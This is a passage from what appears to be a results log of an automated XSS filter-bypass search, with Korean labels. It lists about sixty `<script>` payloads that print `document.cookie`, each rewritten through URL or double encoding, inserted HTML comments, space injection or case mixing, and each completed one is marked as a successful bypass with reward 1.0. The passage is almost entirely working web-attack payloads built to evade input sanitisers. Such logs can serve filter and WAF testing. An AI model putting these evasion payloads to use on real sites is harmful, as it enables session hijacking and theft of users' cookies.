# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%273I4CBO6UWSEXUVNZ9C5K4MNN7TCLKTJN7BLWIPA1N87F46G5Y7%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [42/874] 원본: <script>console.log('ABANDQ0P0QQNFKMR7W36JHL04CUA0YUEHKVKRIORKSDFI90BH2');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27ABANDQ0P0QQNFKMR7W36JHL04CUA0YUEHKVKRIORKSDFI90BH2%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [43/874] 원본: <script>console.log('KMPFVQLGL2AB8A52DPMJ02PH6LN970P86VKX2N0IZQEXHCV0NF');console.log(document.cookie);</script>
#
# ✅ 우회 결과: <!-- -->!-- -->scr<!-- -->!-- -->script>ipt>console.log('KMPFVQLGL2AB8A52DPMJ02PH6LN970P86VKX2N0IZQEXHCV0NF');console.log(document.cookie);<!-- -->!-- -->/script>
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: insert_comment
#
# [44/874] 원본: <script>console.log('D265UARNKHNOKFPVNM68JUDP9TDWAKLD9MQEKDLQ9YLYMDFBXF');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escr%3C%21--%20--%3Escript%3Eipt%3Econsole.log%28%27D265UARNKHNOKFPVNM68JUDP9TDWAKLD9MQEKDLQ9YLYMDFBXF%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [45/874] 원본: <script>console.log('43JI30CAUN165JB8RDWN404VACGB5P7IJTU24KK6NWBIH4WIDC');console.log(document.cookie);</script>
#
# ✅ 우회 결과: <!-- -->!-- -->scr<!-- -->!-- -->script>ipt>console.log('43JI30CAUN165JB8RDWN404VACGB5P7IJTU24KK6NWBIH4WIDC');console.log(document.cookie);<!-- -->!-- -->/script>
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: insert_comment
#
# [46/874] 원본: <script>console.log('FIFNVJUAR0P8GH13F29I4D7T0TNMRYSE2A2B6DN6JE87O0AHAE');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27FIFNVJUAR0P8GH13F29I4D7T0TNMRYSE2A2B6DN6JE87O0AHAE%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [47/874] 원본: <script>console.log('AQ80NQUS4TAQLQVWHMAGXB11KUBK34NZA8RUUD143IFKQDS3P5');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %25253Cscript%25253Econsole.log%252528%252527AQ80NQUS4TAQLQVWHMAGXB11KUBK34NZA8RUUD143IFKQDS3P5%252527%252529%25253Bconsole.log%252528document.cookie%252529%25253B%25253C/script%25253E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [48/874] 원본: <script>console.log('F8SD5KMTGZ21OZ2VASUS67LTOJQYE67IB1MP88HFLFEZ27HPDQ');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27F8SD5KMTGZ21OZ2VASUS67LTOJQYE67IB1MP88HFLFEZ27HPDQ%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [49/874] 원본: <script>console.log('U3RBVJHMI5V2FI60RRVT99ZB019MZYZ7LVI6FT1Z4QJJPPO7K2');console.log(document.cookie);</script>
#
# ✅ 우회 결과: <!-- -->!-- -->scr<!-- -->!-- -->script>ipt>console.log('U3RBVJHMI5V2FI60RRVT99ZB019MZYZ7LVI6FT1Z4QJJPPO7K2');console.log(document.cookie);<!-- -->!-- -->/script>
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: insert_comment
#
# [50/874] 원본: <script>console.log('M6X60XF32D27OZ3LBAV10FSCIXU8NXQ7YI9ZHGS4PU0RN7X09J');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27M6X60XF32D27OZ3LBAV10FSCIXU8NXQ7YI9ZHGS4PU0RN7X09J%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [51/874] 원본: <script>console.log('6QT5G6N6F0VGUUY6FHHLDLO79IFHVE7PRNO72M9UUYYWKGPQTD');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%276QT5G6N6F0VGUUY6FHHLDLO79IFHVE7PRNO72M9UUYYWKGPQTD%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [52/874] 원본: <script>console.log('SBZ0EREBNHH4FCFA1QLB0Y6XZUG927ELO8RHG0P0C9BIMNY8PL');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escr%3C%21--%20--%3Escript%3Eipt%3Econsole.log%28%27SBZ0EREBNHH4FCFA1QLB0Y6XZUG927ELO8RHG0P0C9BIMNY8PL%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [53/874] 원본: <script>console.log('6CHBNT13D9GD2GXRA4TU2OQW5VFJ0JG57ISBT2QH5L7FLUA0DZ');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%276CHBNT13D9GD2GXRA4TU2OQW5VFJ0JG57ISBT2QH5L7FLUA0DZ%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [54/874] 원본: <script>console.log('0PF7GRGX62L580ZC6OTDL1YQN8IXJUTHD3RCZRGQGJJD34LUZR');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%270PF7GRGX62L580ZC6OTDL1YQN8IXJUTHD3RCZRGQGJJD34LUZR%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [55/874] 원본: <script>console.log('120502QR88FTCNKDPZY67ZDCHL380K01YSAJGZFIQFD92RGDLF');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %253Cscr%253Cscript%253Eipt%253Econsole.log%2528%2527120502QR88FTCNKDPZY67ZDCHL380K01YSAJGZFIQFD92RGDLF%2527%2529%253Bconsole.log%2528document.cookie%2529%253B%253C/script%253E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [56/874] 원본: <script>console.log('VDU1IJ21EPTRRJ6A2XT2SCNC9MO0E13X3941HZJNP82147RZT6');console.log(document.cookie);</script>
#
# ✅ 우회 결과: <!-- -->!-- -->scr<!-- -->!-- -->script>ipt>console.log('VDU1IJ21EPTRRJ6A2XT2SCNC9MO0E13X3941HZJNP82147RZT6');console.log(document.cookie);<!-- -->!-- -->/script>
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: insert_comment
#
# [57/874] 원본: <script>console.log('YU13P4DI79YC616HF031862AXB594UG1G1T4T6ZSK9E7VHYV1R');console.log(document.cookie);</script>
#
# ✅ 우회 결과: < !-- -- >scr< !-- -- >script >ipt >console.log('YU13P4DI79YC616HF031862AXB594UG1G1T4T6ZSK9E7VHYV1R');console.log(document.cookie);< !-- -- >/script >
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: space_injection
#
# [58/874] 원본: <script>console.log('APCXYANGU0BQA9K7NBQHVK1TXM48YZ50IWK3P85XL0T0WDWY12');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%20scriPt%20%3ECoNSOLe.LOG%28%27apCxYangu0bqa9K7NbqhvK1TXm48Yz50Iwk3p85Xl0T0WdwY12%27%29%3BcOnSOlE.LOG%28DoCuMeNt.cOOkIE%29%3B%3C%20/Script%20%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [59/874] 원본: <script>console.log('QH5GEJI9VWPPNBXXTDISLML2ENGAZK3A2R0QM7DB6IETYLNJC1');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27QH5GEJI9VWPPNBXXTDISLML2ENGAZK3A2R0QM7DB6IETYLNJC1%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [60/874] 원본: <script>console.log('LV41FSDCGOG4VATAVLO9DZEWNE1ZSP0CXLVMP9BXFUEWN7G4I2');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%20ScrIpt%20%3ECOnsoLe.LoG%28%27Lv41fsdCGoG4vatavLO9DZewNE1zsp0cXLvmp9bxFUeWn7g4I2%27%29%3BCoNSOlE.loG%28DoCUment.CooKie%29%3B%3C%20/SCrIPT%20%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [61/874] 원본: <script>console.log('GP21KV14K8MVY0YNI6Y7KRJIYB7D5HX69PKY76KIIZHLFYDE5U');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27GP21KV14K8MVY0YNI6Y7KRJIYB7D5HX69PKY76KIIZHLFYDE5U%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [62/874] 원본: <script>console.log('2KJFORKUZDAXWDIISRXRK0D8P8EOQ5GMGLF8ISQZ9A1KRQKFJ7');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escr%3C%21--%20--%3Escript%3Eipt%3Econsole.log%28%272KJFORKUZDAXWDIISRXRK0D8P8EOQ5GMGLF8ISQZ9A1KRQKFJ7%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [63/874] 원본: <script>console.log('4QKIS1LED2SAXRQEPSWGZ897CZPMCD04RIOS7BYZ9YATHKDVK5');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %253CScriPT%253EcOnSoLE.log%2528%25274qkIS1lEd2sAxRqePSwgZ897CZPMcD04RIOS7Byz9YAThKdvk5%2527%2529%253BcONSOLE.LOG%2528docuMeNT.COOKie%2529%253B%253C/scripT%253E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [64/874] 원본: <script>console.log('9BV5VZWBCCKC90JTNU7NGELM3NXD29M7LJ8PXQ0XKPBYJ8EQ4W');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %253Cscript%253Econsole.log%2528%25279BV5VZWBCCKC90JTNU7NGELM3NXD29M7LJ8PXQ0XKPBYJ8EQ4W%2527%2529%253Bconsole.log%2528document.cookie%2529%253B%253C/script%253E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [65/874] 원본: <script>console.log('U3EY4IE362QVCQLJU68A979S6WFBLCSFX2420E5PR1QFJPNJOM');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27U3EY4IE362QVCQLJU68A979S6WFBLCSFX2420E5PR1QFJPNJOM%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [66/874] 원본: <script>console.log('W90H1MV3ZUFRF8NHXH9N9ZRQWA3S4A4JMDZP7600ASKWEYS1HD');console.log(document.cookie);</script>
#
# ✅ 우회 결과: <!-- -->!-- -->scr<!-- -->!-- -->script>ipt>console.log('W90H1MV3ZUFRF8NHXH9N9ZRQWA3S4A4JMDZP7600ASKWEYS1HD');console.log(document.cookie);<!-- -->!-- -->/script>
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: insert_comment
#
# [67/874] 원본: <script>console.log('5E6KN6V2R5CFPYZW4L3WZ77E0CRLT23SJM5ZI4I5Z2XZJY7ZOX');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%275E6KN6V2R5CFPYZW4L3WZ77E0CRLT23SJM5ZI4I5Z2XZJY7ZOX%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [68/874] 원본: <script>console.log('76A7L3H148W1NGO2S5P0UK2T0PFN0B06E4U395OPGRNPYUPPL0');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%2776A7L3H148W1NGO2S5P0UK2T0PFN0B06E4U395OPGRNPYUPPL0%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [69/874] 원본: <script>console.log('2GB9PU04ATS8UDHI2JDKAHZRT5JTH3BQ90CIC2QEAU3HZDYGQW');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%272GB9PU04ATS8UDHI2JDKAHZRT5JTH3BQ90CIC2QEAU3HZDYGQW%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [70/874] 원본: <script>console.log('0R03XSKNSK3PRW9UARNKJTFQTAKMGZX6I1PAJBKSBY4AJJ8VBV');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%270R03XSKNSK3PRW9UARNKJTFQTAKMGZX6I1PAJBKSBY4AJJ8VBV%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [71/874] 원본: <script>console.log('BCQJGHIING9PC5BAUYQGOE1I84ICAGPV7OEA54ZL0GQ2KFP1WC');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27BCQJGHIING9PC5BAUYQGOE1I84ICAGPV7OEA54ZL0GQ2KFP1WC%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [72/874] 원본: <script>console.log('G9J117BAF1E9ZI9GL1YKV2FSS2U7KDB2Z5HWXC4R61FIE9JXW8');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27G9J117BAF1E9ZI9GL1YKV2FSS2U7KDB2Z5HWXC4R61FIE9JXW8%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [73/874] 원본: <script>console.log('2G1657H3GSDWJKCCK6QJM6ZHGUKIT8BZL4E8M0QM6Q7A26S2X9');console.log(document.cookie);</script>
#
# ✅ 우회 결과: < !-- -- >scr< !-- -- >script >ipt >console.log('2G1657H3GSDWJKCCK6QJM6ZHGUKIT8BZL4E8M0QM6Q7A26S2X9');console.log(document.cookie);< !-- -- >/script >
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: space_injection
#
# [74/874] 원본: <script>console.log('AENPT32Z8RRSHAI1CJ1I3CH2EOSCM04KKL0LL49C6ML79RT606');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escr%3C%21--%20--%3Escript%3Eipt%3Econsole.log%28%27AENPT32Z8RRSHAI1CJ1I3CH2EOSCM04KKL0LL49C6ML79RT606%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [75/874] 원본: <script>console.log('RXPUZJZFGCH2B0IYXKMZ8MPLORFPNT0ZD2WEEBHD1VPCCOGCCL');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27RXPUZJZFGCH2B0IYXKMZ8MPLORFPNT0ZD2WEEBHD1VPCCOGCCL%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [76/874] 원본: <script>console.log('RWE9EU6V1YBZ10ECA6LVYB8K9MJPYTD2ZT08MJA1MFX64YT8GL');console.log(document.cookie);</script>
#
# ✅ 우회 결과: <!-- -->!-- -->scr<!-- -->!-- -->script>ipt>console.log('RWE9EU6V1YBZ10ECA6LVYB8K9MJPYTD2ZT08MJA1MFX64YT8GL');console.log(document.cookie);<!-- -->!-- -->/script>
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: insert_comment
#
# [77/874] 원본: <script>console.log('NEXT92JGYVMBXNOHNQSE1FU7PDOMGQ7GF7SH794X7S6WEBNUTR');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27NEXT92JGYVMBXNOHNQSE1FU7PDOMGQ7GF7SH794X7S6WEBNUTR%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [78/874] 원본: <script>console.log('EBOZ1IWX2JB65BDRKVQM8HTO43AB1H6BSEHYN1JJ6K4NKGMOQ2');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %253Cscr%253Cscript%253Eipt%253Econsole.log%2528%2527EBOZ1IWX2JB65BDRKVQM8HTO43AB1H6BSEHYN1JJ6K4NKGMOQ2%2527%2529%253Bconsole.log%2528document.cookie%2529%253B%253C/script%253E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [79/874] 원본: <script>console.log('HGWAKE8P711HR7Y6SE5QWQYYMVJ9ORZDVBWPZ80A70L6AD8V5R');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27HGWAKE8P711HR7Y6SE5QWQYYMVJ9ORZDVBWPZ80A70L6AD8V5R%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [80/874] 원본: <script>console.log('5BDJ2LSLVUI72M7USERQEQ28NMZB0VVRH76E9AKTRW40XQMUC0');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%275BDJ2LSLVUI72M7USERQEQ28NMZB0VVRH76E9AKTRW40XQMUC0%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [81/874] 원본: <script>console.log('AMP90R6NDA71JUKO5TBTT1ET8H2MHEPGUBU9JPFO2FM37NKS5U');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27AMP90R6NDA71JUKO5TBTT1ET8H2MHEPGUBU9JPFO2FM37NKS5U%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [82/874] 원본: <script>console.log('D6QV0C0EPZAJ2M4KJKJ4KM0U8DGYJAWBL3M85NHKSM2MOMKCRD');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escr%3C%21--%20--%3Escript%3Eipt%3Econsole.log%28%27D6QV0C0EPZAJ2M4KJKJ4KM0U8DGYJAWBL3M85NHKSM2MOMKCRD%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [83/874] 원본: <script>console.log('XUXNBN09GWZJ7G4VLL98I7TDOLCWMAYHFMW0XT1YL4YBVTPTQD');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27XUXNBN09GWZJ7G4VLL98I7TDOLCWMAYHFMW0XT1YL4YBVTPTQD%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [84/874] 원본: <script>console.log('NSBTKU2T7B7N77J81BLE9B7W8RNRCTNUXALOU8C68CHBQDKP8U');console.log(document.cookie);</script>
#
# ✅ 우회 결과: <!-- -->!-- -->scr<!-- -->!-- -->script>ipt>console.log('NSBTKU2T7B7N77J81BLE9B7W8RNRCTNUXALOU8C68CHBQDKP8U');console.log(document.cookie);<!-- -->!-- -->/script>
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: insert_comment
#
# [85/874] 원본: <script>console.log('ZI4BUFVJC52YPZ883E0QIESJRX1PBRTWPETCC4Z19M5ZHN5YF4');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27ZI4BUFVJC52YPZ883E0QIESJRX1PBRTWPETCC4Z19M5ZHN5YF4%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [86/874] 원본: <script>console.log('3KWWDW4B44544NIEAWFCYFTHVISQDKHHVREVU9TPMOX3UJ61DI');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%273KWWDW4B44544NIEAWFCYFTHVISQDKHHVREVU9TPMOX3UJ61DI%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [87/874] 원본: <script>console.log('J1AF1HQURWM4RA6BMZXF8R4Y72GYYVTLSKCDRJ0EW8DUOFBX2X');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %253CscRipt%253eConSole.lOG%2528%2527j1af1HqurWm4RA6bmZxf8r4Y72gyyvTLsKCDRJ0eW8DuoFBx2X%2527%2529%253BCOnsOLe.LOg%2528DOCUMENT.CooKiE%2529%253B%253c/SCRIpT%253E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: case_shift
#
# [88/874] 원본: <script>console.log('TWW7F7VQF2VGHJDV8GBBM4S2WXNCGV3CP7P74ZULKM6W4A3PDM');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %253Cscript%253Econsole.log%2528%2527TWW7F7VQF2VGHJDV8GBBM4S2WXNCGV3CP7P74ZULKM6W4A3PDM%2527%2529%253Bconsole.log%2528document.cookie%2529%253B%253C/script%253E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [89/874] 원본: <script>console.log('7OZM52KKW693OLFH23KGTENQIDT7FKNTEPYC0XTQ6JG2ATC93X');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%277OZM52KKW693OLFH23KGTENQIDT7FKNTEPYC0XTQ6JG2ATC93X%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [90/874] 원본: <script>console.log('FVO8HBQVVN3B4D773Z2LPTBNXZTXZNB2Y506INNR0IWYPGSR9O');console.log(document.cookie);</script>
#
# ✅ 우회 결과: <!-- -->!-- -->scr<!-- -->!-- -->script>ipt>console.log('FVO8HBQVVN3B4D773Z2LPTBNXZTXZNB2Y506INNR0IWYPGSR9O');console.log(document.cookie);<!-- -->!-- -->/script>
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: insert_comment
#
# [91/874] 원본: <script>console.log('8NYWY6R6VB5M7GT9BFUGZJTC4YAFS8WW7C047QRD42YAEN089P');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%278NYWY6R6VB5M7GT9BFUGZJTC4YAFS8WW7C047QRD42YAEN089P%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [92/874] 원본: <script>console.log('VS1C715Q2WUQ0P8CAVUSWKJH3UH4KNO330ONGHMAV6ATHPW9KN');console.log(document.cookie);</script>
#
# ✅ 우회 결과: <!-- -->!-- -->scr<!-- -->!-- -->script>ipt>console.log('VS1C715Q2WUQ0P8CAVUSWKJH3UH4KNO330ONGHMAV6ATHPW9KN');console.log(document.cookie);<!-- -->!-- -->/script>
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: insert_comment
#
# [93/874] 원본: <script>console.log('2F4IID09KXAJ19B1YNN3PBW0ISIKHYDU71BMDM494Y6SNGXI5I');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escr%3C%21--%20--%3Escript%3Eipt%3Econsole.log%28%272F4IID09KXAJ19B1YNN3PBW0ISIKHYDU71BMDM494Y6SNGXI5I%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [94/874] 원본: <script>console.log('N2M8V1DGIVQE0OGMV822N72NKYV4EOUN6L0X1KTFUWYE01Q77P');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escr%3C%21--%20--%3Escript%3Eipt%3Econsole.log%28%27N2M8V1DGIVQE0OGMV822N72NKYV4EOUN6L0X1KTFUWYE01Q77P%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [95/874] 원본: <script>console.log('G4IG5P3WL4SEXGZ92OOYQ9BCDCQH4AI9QWXTS0KYQWX0OJ20DB');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27G4IG5P3WL4SEXGZ92OOYQ9BCDCQH4AI9QWXTS0KYQWX0OJ20DB%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [96/874] 원본: <script>console.log('FH12R4JOUAMGUE5L8CP4YP0B5UNUSD6R1E0E5SKWEHO9Z5N66L');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27FH12R4JOUAMGUE5L8CP4YP0B5UNUSD6R1E0E5SKWEHO9Z5N66L%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [97/874] 원본: <script>console.log('7UWXI0UPVT7KT22RYQK09K2A9RHQZB8G2DKVBO5VC6EUPTBWU8');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%277UWXI0UPVT7KT22RYQK09K2A9RHQZB8G2DKVBO5VC6EUPTBWU8%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [98/874] 원본: <script>console.log('FLS9FVJ5V6CPVPYDZ528V2TYVI7SZD8411DROS9V6B04VQGBQJ');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escr%3C%21--%20--%3Escript%3Eipt%3Econsole.log%28%27FLS9FVJ5V6CPVPYDZ528V2TYVI7SZD8411DROS9V6B04VQGBQJ%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [99/874] 원본: <script>console.log('QWFGP09DGRSE6R8TITZ5FBUAMDYMD0NBYT46D1AXJMUJJYOY8F');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %253CScRiPt%253EconsOlE.loG%2528%2527Qwfgp09dGRse6R8titZ5fBUAMdYmd0NbYt46d1aXJmuJjYOY8F%2527%2529%253BCoNSoLE.LOg%2528dOcUMEnT.COokIe%2529%253B%253C/sCRiPt%253E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [100/874] 원본: <script>console.log('VVQE0YUT1WZZSL0YN1KLDVEWFAXPK1ZMUIRB1XJUB5TAVMQ2VM');console.log(document.cookie);</script>
#
